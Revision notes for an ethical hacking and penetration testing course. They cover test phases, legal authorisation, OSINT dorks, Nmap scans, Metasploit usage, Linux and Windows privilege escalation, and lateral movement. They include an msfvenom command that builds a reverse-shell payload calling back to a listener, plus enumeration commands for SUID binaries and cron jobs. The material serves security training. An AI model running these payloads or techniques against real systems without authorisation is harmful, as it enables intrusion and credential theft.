# Month 7 — Ethical Hacking & Penetration Testing: Quick Revision Notes

## Penetration Testing Phases

| Phase | Goal | Key Actions |
|---|---|---|
| Recon | Gather intel without touching target | OSINT, Google dorking, Shodan |
| Scanning | Map attack surface | Nmap, Nessus, ping sweeps |
| Enumeration | Extract users, services, shares | Enum4linux, SMB, SNMP queries |
| Exploitation | Gain initial access | Metasploit, manual exploits |
| Post-Exploitation | Persist, pivot, escalate | Meterpreter, Mimikatz, lateral move |
| Reporting | Document findings with CVSS | Executive + technical sections |

## Legal & Scope

- **Rules of Engagement (RoE)** — written agreement defining scope, timing, exclusions
- **Authorisation** is mandatory; verbal is not sufficient — get it in writing
- **Bug bounty** programmes define scope via policy.txt or HackerOne/Bugcrowd pages
- **Notifiable territories** — some exploits must be reported to regulators (GDPR, NCA)
- Out-of-scope touching = potential criminal liability (CMA 1990 UK / CFAA USA)

## OSINT Tools

- **Shodan** — search engine for internet-connected devices; filter by port, banner, org
- **theHarvester** — scrapes emails, subdomains, IPs from search engines
- **Maltego** — graph-based OSINT; entities: person → email → domain → IP → netblock
- **Google Dorks** — `site:`, `filetype:`, `inurl:`, `intitle:`, `cache:` operators
- **WHOIS / Amass** — domain registration data, DNS enumeration

```bash
# Google dork examples
site:target.com filetype:pdf
intitle:"index of" site:target.com
inurl:admin site:target.com
```

## Nmap Essentials

```bash
nmap -sn 192.168.1.0/24          # Host discovery (ping sweep)
nmap -sS -p- target              # SYN scan all ports (stealth)
nmap -sV -sC -p80,443 target     # Version + default scripts
nmap -O target                   # OS fingerprinting
nmap --script vuln target        # Vulnerability scan via NSE
nmap -A target                   # Aggressive: OS + version + scripts + traceroute
```

## Metasploit Framework

- `msfconsole` — main CLI interface
- `search <keyword>` — find modules
- `use <module>` → `show options` → `set RHOSTS target` → `run`
- **Payloads**: `staged` (small dropper + listener) vs `stageless` (all-in-one)
- **Meterpreter**: in-memory shell; `sysinfo`, `getuid`, `hashdump`, `migrate`
- `msfvenom` — standalone payload generator

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
```

## Privilege Escalation — Linux

- **SUID abuse** — binaries with setuid bit run as owner (root); check GTFOBins
- **Sudo misconfigs** — `sudo -l` reveals allowed commands; `sudo !/bin/bash` in editors
- **Kernel exploits** — uname -r → searchsploit kernel version
- **Cron jobs** — world-writable scripts run as root via cron
- **PATH hijacking** — replace binary in PATH used by root-owned script

```bash
find / -perm -4000 2>/dev/null   # Find SUID binaries
sudo -l                          # List sudo permissions
cat /etc/crontab                 # Check cron jobs
```

## Privilege Escalation — Windows

- **Token impersonation** — use Incognito in Meterpreter; `list_tokens -u`
- **Unquoted service paths** — service path with spaces; drop exe in writable directory
- **AlwaysInstallElevated** — if both HKCU and HKLM set to 1, MSI runs as SYSTEM
- **DLL hijacking** — replace missing DLL in application directory with malicious one
- **Weak service permissions** — modify service binary path via `sc config`

## Lateral Movement Techniques

| Technique | Tool | Notes |
|---|---|---|
| Pass-the-Hash | Mimikatz, PsExec | NTLM hash replays without cracking |
| PsExec | Sysinternals PsExec | Remote execution via SMB |
| WMI | wmic / PowerShell | Execute commands on remote hosts |
| SMB | psexec.py (Impacket) | File-based lateral movement |

## TryHackMe & HackTheBox Tips

- **TryHackMe**: Start with "Pre-Security" → "SOC Level 1" → "Jr Penetration Tester" paths
- **HackTheBox**: "Starting Point" machines are guided; "Active" machines are unguided
- **VulnHub**: Download VMs locally (Metasploitable2, DVWA, Kioptrix)
- Document every step: screenshots + commands used = your portfolio evidence
